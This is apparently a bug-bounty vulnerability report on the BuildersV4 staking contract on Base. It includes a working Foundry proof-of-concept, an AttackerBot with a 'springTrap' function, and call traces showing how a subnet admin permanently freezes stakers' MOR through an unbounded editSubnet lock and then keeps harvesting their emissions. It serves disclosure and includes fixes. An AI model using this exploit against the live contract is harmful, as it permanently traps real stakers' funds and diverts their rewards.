# BuildersV4 — Permanent withdrawal lock + ongoing emission harvest via unbounded `editSubnet`

**Severity: High (top of band).** Permanent, unrecoverable loss of staker principal in any
attacker-created subnet, plus ongoing attacker reward extraction on the trapped principal. 
Bounded to the attacker's own subnet, so not Critical.

---

## TARGET

- **Contract:** `BuildersV4` (proxy) `0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9` on **Base (chainid 8453)**
  - Implementation at test block: `0x18faef315b40a6d9cf49628f1133b1aa507513b0`
- **Interacts with:** `BuildersTreasuryV2` `0x9eba628581896ce086cb8f1A513ea6097A8FC561`
- **Token:** MOR `0x7431aDa8a591C955a994a21710752EF9b882b8e3`
- **Fork block:** `58_680_000` (Base mainnet fork)
- **On-chain config at that block:** `subnetCreationFeeAmount() = 0`, `minimalWithdrawLockPeriod() = 604800` (7 days),
  live Builders TVL `allSubnetsData.totalDeposited ≈ 3,000,551 MOR`, treasury balance `≈ 53,555 MOR`.

In Appendix A scope (Builders on Base). No published audit covers deployed V4 — Trust Security (Mar 2025)
covered only BuildersV2.

---

## INVARIANT

Two protocol invariants are broken:

1. **"Users can withdraw their staked MOR at any time after the lock period."** (Builders FAQ / docs.)
   A deposit must always become withdrawable at some finite future timestamp.
2. **Reward emissions on a subnet's deposited principal belong to that principal's owner**, not to a
   third party who has frozen that principal against its owner's will.

---

## IMPACT

An **unprivileged** attacker (anyone — subnet creation is free and permissionless) can:

1. **Permanently freeze all staker principal in a subnet they admin.** `withdraw()` reverts at every
   possible timestamp, forever. The funds are not "temporarily locked" — the revert is caused by a
   checked-arithmetic overflow that no amount of waiting clears, and only the subnet admin could lower
   the lock (the attacker burns that role).
2. **Continue harvesting MOR emissions that accrue on the trapped principal**, via the retained
   `claimAdmin`, because `claim()` does not check the lock.

**Quantified (from the passing PoC, MOR priced at $0.699275):**

| Scenario | MOR | USD |
|---|---|---|
| Single 100k-MOR staker permanently locked | 100,000 | $69,927 |
| Realistic 3-victim stealth trap (100k each) | 300,000 | $209,782 |
| Attacker emission harvest on trapped stake, 120 days | 27,056 | $18,919 |

The trapped amount scales linearly with the subnet's TVL. Live Builders TVL is ~3,000,551 MOR, so
100k-MOR stakers are ordinary, not synthetic. Emission harvest is bounded only by the shared treasury
balance (~53,555 MOR at the test block) per claim window, and recurs as the treasury is topped up.

---

## PRECONDITIONS

- Attacker holds **only ETH** (for gas and a trivial self-funding swap). No MOR airdrop, no privileged role.
- `subnetCreationFeeAmount() == 0` (true on-chain) → subnet creation is free.
- Victims deposit into the attacker's subnet. The attacker makes this realistic by running an honest
  7-day lock first and letting an early staker withdraw cleanly, so the subnet looks safe before the trap.
- **No owner/admin/multisig impersonation.** The attacker is the subnet admin — a permissionless role
  obtained by `createSubnet`, explicitly distinct from the protocol owner.

---

## ATTACK

1. `createSubnet(name, {admin: attacker, claimAdmin: attacker, withdrawLockPeriodAfterDeposit: 7 days, minimalDeposit: 0})`.
   Free and permissionless.
2. Optionally self-seed the pool (attacker buys MOR with ETH on Uniswap and deposits it) so the subnet looks legitimate.
3. Let it run honestly. An early staker deposits and withdraws after 7 days — succeeds, building trust.
4. Victims deposit (e.g. 100k MOR each).
5. **Spring the trap in one `editSubnet` call:** set `withdrawLockPeriodAfterDeposit = type(uint128).max`,
   set `admin = 0xdead` (abandon), keep `claimAdmin = attacker`. `editSubnet` only re-validates a *minimum*
   lock floor and forbids name changes — it imposes **no upper bound** and no post-deposit freeze
   (`_validateSubnet`, `BuildersV4.sol:243`). V4 deleted V3's `editPoolDeadline` guard
   (now `unusedStorage1_V4Update`), so there is no longer any deadline after which the lock is frozen.
6. Every staker's `withdraw()` now reverts forever. The check is
   `block.timestamp > userData.lastDeposit + subnet.withdrawLockPeriodAfterDeposit` (`BuildersV4.sol:~311`)
   computed in checked `uint128`; `lastDeposit + type(uint128).max` **overflows and reverts** at all
   timestamps. `withdraw()` reads the *current* stored subnet lock, not a per-deposit snapshot, so the
   mutation retroactively traps already-deposited funds — including stakers long past the original 7 days.
7. The attacker calls `claim(subnetId, attacker)` (`BuildersV4.sol:326`). `claim()` checks only
   `admin || claimAdmin` and **ignores the lock**, so the attacker keeps draining the emissions that
   accrue on the trapped principal via `BuildersTreasuryV2.sendRewards`.

**Why it is not merely a temporary DoS (the Medium rebuttal):** the lock cannot be waited out (overflow),
and the only actor who could lower it is the admin, which the attacker burned. Recovery requires a UUPS
proxy upgrade by the protocol owner — there is no pause, per-subnet override, or emergency-withdraw path
(the only owner setters are `setFeeConfig`, `setBuildersTreasury`, `setRewardPool`, `setNetworkShareOwner`,
`setSubnetCreationFeeAmount`, and `setMinimalWithdrawLockPeriod`, which is a floor for *future* validation
only and does not reduce an existing subnet's stored lock).

---

## POC

Foundry, Base mainnet fork pinned at block `58_680_000`. **No `vm.prank` anywhere.** Attacker and victims
are real deployed contracts acting as themselves (genuine `msg.sender`). The attacker is funded with ETH
only and buys its MOR through the real Uniswap V3 pool on Base. Victims are seeded with MOR to model real
stakers (live Builders TVL ~3M MOR). Cheatcodes used: `createSelectFork`, `warp` (time), `deal` of native
ETH and of victim MOR only — none grant any protocol privilege.

File: `test/BuildersV4LockReal.t.sol`. Run: `forge test -vv`.

```
[PASS] test_baseline_honest_withdraw()        // honest lock -> withdraw works (invariant holds)
[PASS] test_live_inducible_full_attack()
  Attacker MOR bought with 20 ETH (self-funded): 15673
  Permanently trapped victim MOR: 300000      // $209,782
  Attacker emissions harvested in 120 days (MOR): 27056   // $18,919
```

`config:` solc 0.8.24, optimizer 200 runs, EVM paris (matches deployed). See `foundry.toml`.

---

## FIX

Any one of:

1. **Cap the lock** in `_validateSubnet`: require `withdrawLockPeriodAfterDeposit <= MAX_LOCK`
   (e.g. a protocol-wide constant), so it can never approach `type(uint128).max`.
2. **Forbid increasing the lock after deposits exist**, or snapshot the lock per deposit in `UserData`
   so later `editSubnet` changes cannot retroactively trap already-deposited principal (restore the
   V3 `editPoolDeadline` semantics that V4 removed).
3. **Use unchecked-safe comparison** in `withdraw` (compare against `type(uint128).max - lastDeposit`
   instead of adding), so an extreme lock degrades to "very long" rather than a permanent revert — though
   (1)/(2) are the real fixes since an extreme-but-finite lock is still a freeze.

Independently, `claim()` should not pay rewards on principal that the same admin has made permanently
unwithdrawable.

---

# APPENDIX — VERBATIM SOURCE AND OUTPUT (byte-for-byte)

Everything below is reproduced exactly as on disk / as emitted. Reproduce with:
```bash
forge test -vvvv    # full call traces
forge test -vv      # logs only
```

## A1. `foundry.toml`

```toml
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
solc = "0.8.24"
optimizer = true
optimizer_runs = 200
evm_version = "paris"
fs_permissions = [{ access = "read", path = "./"}]

[rpc_endpoints]
base = "https://base.drpc.org"
```

## A2. `test/BuildersV4LockReal.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console} from "forge-std/Test.sol";

/*//////////////////////////////////////////////////////////////
  Realistic, live-inducible PoC for the BuildersV4 permanent-lock
  escalation. NO identity cheatcodes:
    - attacker & victims are real deployed CONTRACTS acting as
      themselves (genuine msg.sender; no vm.prank anywhere).
    - the attacker is funded ONLY with native ETH and buys the MOR
      it uses through the real Uniswap V3 pool on Base (no deal of
      MOR to the attacker).
    - victims are seeded with MOR to MODEL real existing stakers.
      Live Builders TVL at the pinned block is ~3,000,551 MOR, so
      100k-MOR stakers are well within what real users hold.
  Cheatcodes used are limited to: createSelectFork, warp (time),
  and deal of *native ETH* (freely acquirable) / *victim MOR*
  (modeling real stakers). None grant any protocol privilege.
//////////////////////////////////////////////////////////////*/

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface ISwapRouter02 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata) external payable returns (uint256);
}

struct Subnet {
    string name;
    address admin;
    uint128 unusedStorage1_V4Update;
    uint128 withdrawLockPeriodAfterDeposit;
    uint128 unusedStorage2_V4Update;
    uint256 minimalDeposit;
    address claimAdmin;
}

struct SubnetMetadata {
    string slug;
    string description;
    string website;
    string image;
}

interface IBuildersV4 {
    function createSubnet(Subnet calldata, SubnetMetadata calldata) external;
    function editSubnet(bytes32, Subnet calldata) external;
    function deposit(bytes32, uint256) external;
    function withdraw(bytes32, uint256) external;
    function claim(bytes32, address) external;
    function getSubnetId(string memory) external view returns (bytes32);
    function getCurrentSubnetRewards(bytes32) external view returns (uint256);
    function minimalWithdrawLockPeriod() external view returns (uint256);
}

address constant BUILDERS_ADDR = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
address constant MOR_ADDR      = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
address constant WETH_ADDR     = 0x4200000000000000000000000000000000000006;
address constant ROUTER_ADDR   = 0x2626664c2603336E57B271c5C0b26F421741e481; // Uniswap SwapRouter02 (Base)
uint24  constant POOL_FEE      = 3000;

/// Real attacker: starts with ETH only, buys MOR on Uniswap, runs the subnet.
contract AttackerBot {
    IBuildersV4 constant B = IBuildersV4(BUILDERS_ADDR);
    IERC20 constant MOR = IERC20(MOR_ADDR);

    /// Self-fund: wrap ETH, swap to MOR on the real pool. Returns MOR received.
    function selfFundWithEth(uint256 ethIn) external returns (uint256) {
        IWETH(WETH_ADDR).deposit{value: ethIn}();
        IWETH(WETH_ADDR).approve(ROUTER_ADDR, ethIn);
        return ISwapRouter02(ROUTER_ADDR).exactInputSingle(
            ISwapRouter02.ExactInputSingleParams({
                tokenIn: WETH_ADDR,
                tokenOut: MOR_ADDR,
                fee: POOL_FEE,
                recipient: address(this),
                amountIn: ethIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
    }

    function createHonestSubnet(string calldata name, uint128 lock) external {
        Subnet memory s;
        s.name = name;
        s.admin = address(this);
        s.withdrawLockPeriodAfterDeposit = lock;
        s.minimalDeposit = 0;
        s.claimAdmin = address(this);
        B.createSubnet(s, SubnetMetadata("", "", "", ""));
    }

    function seedOwnSubnet(bytes32 id, uint256 amount) external {
        MOR.approve(BUILDERS_ADDR, amount);
        B.deposit(id, amount);
    }

    /// Spring the trap: max lock, burn admin, keep claimAdmin = self.
    function springTrap(bytes32 id, string calldata name) external {
        Subnet memory s;
        s.name = name;
        s.admin = address(0xdead);
        s.withdrawLockPeriodAfterDeposit = type(uint128).max;
        s.minimalDeposit = 0;
        s.claimAdmin = address(this);
        B.editSubnet(id, s);
    }

    function harvest(bytes32 id) external {
        B.claim(id, address(this));
    }
}

/// Real honest staker: an ordinary contract that deposits and withdraws.
contract StakerBot {
    IBuildersV4 constant B = IBuildersV4(BUILDERS_ADDR);
    IERC20 constant MOR = IERC20(MOR_ADDR);

    function stake(bytes32 id, uint256 amount) external {
        MOR.approve(BUILDERS_ADDR, amount);
        B.deposit(id, amount);
    }

    function unstake(bytes32 id, uint256 amount) external {
        B.withdraw(id, amount);
    }
}

contract BuildersV4LockRealTest is Test {
    IBuildersV4 constant BUILDERS = IBuildersV4(BUILDERS_ADDR);
    IERC20 constant MOR = IERC20(MOR_ADDR);

    uint256 constant PRICE_1e6 = 699275; // $0.699275 (historical, for USD logging)

    AttackerBot attacker;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("base"), 58_680_000);
        attacker = new AttackerBot();
        // ETH is freely acquirable; this is the attacker's only funding.
        vm.deal(address(attacker), 100 ether);
    }

    function _usd(uint256 morWei) internal pure returns (uint256) {
        return morWei * PRICE_1e6 / 1e6 / 1e18;
    }

    // Model a real staker holding MOR (acquired off-DEX over time, like today's
    // 3M MOR of live stakers). Returns the funded bot.
    function _newStaker(uint256 morAmount) internal returns (StakerBot b) {
        b = new StakerBot();
        deal(MOR_ADDR, address(b), morAmount);
    }

    // -------------------------------------------------------------------------
    // Full realistic attack an attacker could run today:
    //  1. attacker starts with ETH only, buys MOR on Uniswap, seeds its subnet
    //  2. honest 7-day lock; an early staker deposits and withdraws cleanly
    //  3. reassured victims pile in (100k each)
    //  4. attacker springs the trap in ONE tx and burns admin
    //  5. every victim is permanently locked
    //  6. attacker keeps harvesting emissions on the trapped principal
    // -------------------------------------------------------------------------
    function test_live_inducible_full_attack() public {
        string memory name = "ai-grants-pool";
        uint128 minLock = uint128(BUILDERS.minimalWithdrawLockPeriod());

        // (1) attacker self-funds with ETH via the real Uniswap pool
        uint256 morBought = attacker.selfFundWithEth(20 ether);
        console.log("Attacker MOR bought with 20 ETH (self-funded):", morBought / 1e18);
        assertGt(morBought, 0, "attacker acquired MOR with ETH only");

        attacker.createHonestSubnet(name, minLock);
        bytes32 id = BUILDERS.getSubnetId(name);
        attacker.seedOwnSubnet(id, morBought); // admin seeds its own pool -> looks legit

        // (2) early staker trusts it: deposits then withdraws cleanly after 7 days
        StakerBot early = _newStaker(20_000e18);
        early.stake(id, 20_000e18);
        vm.warp(block.timestamp + minLock + 1);
        early.unstake(id, 20_000e18);
        assertEq(MOR.balanceOf(address(early)), 20_000e18, "early staker withdrew -> subnet looks safe");

        // (3) reassured victims pile in at 100k each
        StakerBot v1 = _newStaker(100_000e18);
        StakerBot v2 = _newStaker(100_000e18);
        StakerBot v3 = _newStaker(100_000e18);
        v1.stake(id, 100_000e18);
        vm.warp(block.timestamp + 5 days);
        v2.stake(id, 100_000e18);
        vm.warp(block.timestamp + 5 days);
        v3.stake(id, 100_000e18);

        uint256 trapped = 300_000e18;
        StakerBot[3] memory vs = [v1, v2, v3];

        // (4) spring the trap in one tx and abandon admin to a burn address
        attacker.springTrap(id, name);

        // (5) PERMANENCE: demonstrate the lock holds at an extreme future time.
        //     Snapshot first so we can rewind and harvest within a realistic window.
        uint256 snap = vm.snapshotState();
        vm.warp(block.timestamp + 36500 days); // +100 years
        for (uint256 i; i < 3; i++) {
            vm.expectRevert();
            vs[i].unstake(id, 100_000e18);
            assertEq(MOR.balanceOf(address(vs[i])), 0, "victim principal trapped forever");
        }
        console.log("Permanently trapped victim MOR:", trapped / 1e18);
        console.log("USD at $0.699275:", _usd(trapped));
        vm.revertToState(snap);

        // (6) HARVEST: within a realistic window (treasury holds ~53.5k MOR), the
        //     attacker's retained claimAdmin harvests emissions accruing on the
        //     trapped principal while victims remain locked.
        vm.warp(block.timestamp + 120 days);
        // victims are still locked at this ordinary near-future time
        vm.expectRevert();
        v1.unstake(id, 100_000e18);

        uint256 pending = BUILDERS.getCurrentSubnetRewards(id);
        assertGt(pending, 0, "trapped principal still earns emissions");
        uint256 before = MOR.balanceOf(address(attacker));
        attacker.harvest(id);
        uint256 gained = MOR.balanceOf(address(attacker)) - before;
        assertGt(gained, 0, "attacker harvested emissions while victims stay locked");
        console.log("Attacker emissions harvested in 120 days (MOR):", gained / 1e18);
        console.log("USD at $0.699275:", _usd(gained));
    }

    // -------------------------------------------------------------------------
    // Baseline: under an honest lock the documented "withdraw any time after the
    // lock" invariant holds (no prank; ordinary contract staker).
    // -------------------------------------------------------------------------
    function test_baseline_honest_withdraw() public {
        string memory name = "honest-pool";
        uint128 minLock = uint128(BUILDERS.minimalWithdrawLockPeriod());
        attacker.createHonestSubnet(name, minLock);
        bytes32 id = BUILDERS.getSubnetId(name);

        StakerBot s = _newStaker(100_000e18);
        s.stake(id, 100_000e18);
        vm.warp(block.timestamp + minLock + 1);
        s.unstake(id, 100_000e18);
        assertEq(MOR.balanceOf(address(s)), 100_000e18, "honest lock honored");
    }
}
```

## A3. `forge test -vvvv` output (full, with call traces)

```text
Compiling 20 files with Solc 0.8.24
Solc 0.8.24 finished in 948.69ms
Compiler run successful!

Ran 2 tests for test/BuildersV4LockReal.t.sol:BuildersV4LockRealTest
[PASS] test_baseline_honest_withdraw() (gas: 977040)
Traces:
  [1090940] BuildersV4LockRealTest::test_baseline_honest_withdraw()
    ├─ [7257] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::minimalWithdrawLockPeriod() [staticcall]
    │   ├─ [2362] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::minimalWithdrawLockPeriod() [delegatecall]
    │   │   └─ ← [Return] 604800 [6.048e5]
    │   └─ ← [Return] 604800 [6.048e5]
    ├─ [157525] AttackerBot::createHonestSubnet("honest-pool", 604800 [6.048e5])
    │   ├─ [130320] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::createSubnet(Subnet({ name: "honest-pool", admin: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, unusedStorage1_V4Update: 0, withdrawLockPeriodAfterDeposit: 604800 [6.048e5], unusedStorage2_V4Update: 0, minimalDeposit: 0, claimAdmin: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f }), SubnetMetadata({ slug: "", description: "", website: "", image: "" }))
    │   │   ├─ [125320] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::createSubnet(Subnet({ name: "honest-pool", admin: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, unusedStorage1_V4Update: 0, withdrawLockPeriodAfterDeposit: 604800 [6.048e5], unusedStorage2_V4Update: 0, minimalDeposit: 0, claimAdmin: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f }), SubnetMetadata({ slug: "", description: "", website: "", image: "" })) [delegatecall]
    │   │   │   ├─  emit topic 0: 0x324be7615e7426fd202129f38dc6e54fba11d31a44c1840c079569443bf5761e
    │   │   │   │        topic 1: 0x21254d8e9d4eff977bdbb94cb67c3bc5f9868b930e9b1d633e7d80e80ef09e6c
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─  emit topic 0: 0x81e40ef5fe671f06602768a6c0c1027dd2a1a6fd34bfb1260443741b283cb86e
    │   │   │   │        topic 1: 0x21254d8e9d4eff977bdbb94cb67c3bc5f9868b930e9b1d633e7d80e80ef09e6c
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000093a80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000000b686f6e6573742d706f6f6c000000000000000000000000000000000000000000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [5999] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::getSubnetId("honest-pool") [staticcall]
    │   ├─ [1092] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::getSubnetId("honest-pool") [delegatecall]
    │   │   └─ ← [Return] 0x21254d8e9d4eff977bdbb94cb67c3bc5f9868b930e9b1d633e7d80e80ef09e6c
    │   └─ ← [Return] 0x21254d8e9d4eff977bdbb94cb67c3bc5f9868b930e9b1d633e7d80e80ef09e6c
    ├─ [171595] → new StakerBot@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
    │   └─ ← [Return] 548 bytes of code
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0x7431aDa8a591C955a994a21710752EF9b882b8e3) [staticcall]
    │   └─ ← [Return] [0x9f8aa0eba0f1b9d16244438c5c79395d40bc164f758cd6b3d355bc1997b44403], []
    ├─ [0] VM::stopRecord()
    │   └─ ← [Return]
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x9f8aa0eba0f1b9d16244438c5c79395d40bc164f758cd6b3d355bc1997b44403) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0x7431aDa8a591C955a994a21710752EF9b882b8e3, slot: 72162678451631132973857072364693401046159713466004855973750577117071416771587 [7.216e76])
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x9f8aa0eba0f1b9d16244438c5c79395d40bc164f758cd6b3d355bc1997b44403) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x9f8aa0eba0f1b9d16244438c5c79395d40bc164f758cd6b3d355bc1997b44403, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x9f8aa0eba0f1b9d16244438c5c79395d40bc164f758cd6b3d355bc1997b44403, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0x7431aDa8a591C955a994a21710752EF9b882b8e3, fsig: 0x70a08231, keysHash: 0xb3024e141922907eb80bf787d622b0c592108908135c35e38e6ebb7d5636f1e4, slot: 72162678451631132973857072364693401046159713466004855973750577117071416771587 [7.216e76])
    ├─ [0] VM::load(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x9f8aa0eba0f1b9d16244438c5c79395d40bc164f758cd6b3d355bc1997b44403) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0x7431aDa8a591C955a994a21710752EF9b882b8e3, 0x9f8aa0eba0f1b9d16244438c5c79395d40bc164f758cd6b3d355bc1997b44403, 0x00000000000000000000000000000000000000000000152d02c7e14af6800000)
    │   └─ ← [Return]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [228316] StakerBot::stake(0x21254d8e9d4eff977bdbb94cb67c3bc5f9868b930e9b1d633e7d80e80ef09e6c, 100000000000000000000000 [1e23])
    │   ├─ [24676] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::approve(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, 100000000000000000000000 [1e23])
    │   │   ├─ emit Approval(owner: StakerBot: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], spender: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 100000000000000000000000 [1e23])
    │   │   └─ ← [Return] true
    │   ├─ [175804] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::deposit(0x21254d8e9d4eff977bdbb94cb67c3bc5f9868b930e9b1d633e7d80e80ef09e6c, 100000000000000000000000 [1e23])
    │   │   ├─ [170906] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::deposit(0x21254d8e9d4eff977bdbb94cb67c3bc5f9868b930e9b1d633e7d80e80ef09e6c, 100000000000000000000000 [1e23]) [delegatecall]
    │   │   │   ├─ [15506] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::transferFrom(StakerBot: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, 100000000000000000000000 [1e23])
    │   │   │   │   ├─ emit Approval(owner: StakerBot: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], spender: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 0)
    │   │   │   │   ├─ emit Transfer(from: StakerBot: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], to: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, amount: 100000000000000000000000 [1e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [19621] 0xDC99a8596e395E52aba2BD08C623E1e428Dc3980::getPeriodRewards(3, 1794923930 [1.794e9], 1794926375 [1.794e9]) [staticcall]
    │   │   │   │   ├─ [14714] 0x4De9D52A6a951C2Dc7b22805EEec2bC41404909d::getPeriodRewards(3, 1794923930 [1.794e9], 1794926375 [1.794e9]) [delegatecall]
    │   │   │   │   │   ├─ [2511] 0x2265ae4127a49218c1C562Cb16822971f295Ed50::getPeriodReward(3456000000000000000000 [3.456e21], 592558728240000000 [5.925e17], 1707393600 [1.707e9], 86400 [8.64e4], 1794923930 [1.794e9], 1794926375 [1.794e9]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000046182f0b6ea89b28d
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000046182f0b6ea89b28d
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000046182f0b6ea89b28d
    │   │   │   ├─  emit topic 0: 0x6c7131e79092f16af04daf787c07a4dc80e7ae1a95dbe1cc1a310cfe1619d2db
    │   │   │   │        topic 1: 0x21254d8e9d4eff977bdbb94cb67c3bc5f9868b930e9b1d633e7d80e80ef09e6c
    │   │   │   │        topic 2: 0x000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000152d02c7e14af6800000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [0] VM::warp(1795531176 [1.795e9])
    │   └─ ← [Return]
    ├─ [171905] StakerBot::unstake(0x21254d8e9d4eff977bdbb94cb67c3bc5f9868b930e9b1d633e7d80e80ef09e6c, 100000000000000000000000 [1e23])
    │   ├─ [147003] 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9::withdraw(0x21254d8e9d4eff977bdbb94cb67c3bc5f9868b930e9b1d633e7d80e80ef09e6c, 100000000000000000000000 [1e23])
    │   │   ├─ [142105] 0x18FAEf315b40A6D9cf49628f1133B1Aa507513B0::withdraw(0x21254d8e9d4eff977bdbb94cb67c3bc5f9868b930e9b1d633e7d80e80ef09e6c, 100000000000000000000000 [1e23]) [delegatecall]
    │   │   │   ├─ [23031] 0xDC99a8596e395E52aba2BD08C623E1e428Dc3980::getPeriodRewards(3, 1794926375 [1.794e9], 1795531176 [1.795e9]) [staticcall]
    │   │   │   │   ├─ [18124] 0x4De9D52A6a951C2Dc7b22805EEec2bC41404909d::getPeriodRewards(3, 1794926375 [1.794e9], 1795531176 [1.795e9]) [delegatecall]
    │   │   │   │   │   ├─ [5921] 0x2265ae4127a49218c1C562Cb16822971f295Ed50::getPeriodReward(3456000000000000000000 [3.456e21], 592558728240000000 [5.925e17], 1707393600 [1.707e9], 86400 [8.64e4], 1794926375 [1.794e9], 1795531176 [1.795e9]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000043af8ab85d9e3fd643b
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000043af8ab85d9e3fd643b
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000043af8ab85d9e3fd643b
    │   │   │   ├─ [29849] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::transfer(StakerBot: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 100000000000000000000000 [1e23])
    │   │   │   │   ├─ emit Transfer(from: 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, to: StakerBot: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], amount: 100000000000000000000000 [1e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─  emit topic 0: 0x91ce5144c91c77840ff78678c0787f033a9f2209ab6a26552adb61a542da4a0d
    │   │   │   │        topic 1: 0x21254d8e9d4eff977bdbb94cb67c3bc5f9868b930e9b1d633e7d80e80ef09e6c
    │   │   │   │        topic 2: 0x000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000152d02c7e14af6800000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [2664] 0x7431aDa8a591C955a994a21710752EF9b882b8e3::balanceOf(StakerBot: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    └─ ← [Stop]

[PASS] test_live_inducible_full_attack() (gas: 3737530)
Logs:
  Attacker MOR bought with 20 ETH (self-funded): 15673
  Permanently trapped victim MOR: 300000
  USD at $0.699275: 209782
  Attacker emissions harvested in 120 days (MOR): 27056
  USD at $0.699275: 18919

Traces:
  [4228830] BuildersV4LockRealTest::test_live_inducible_full_attack()
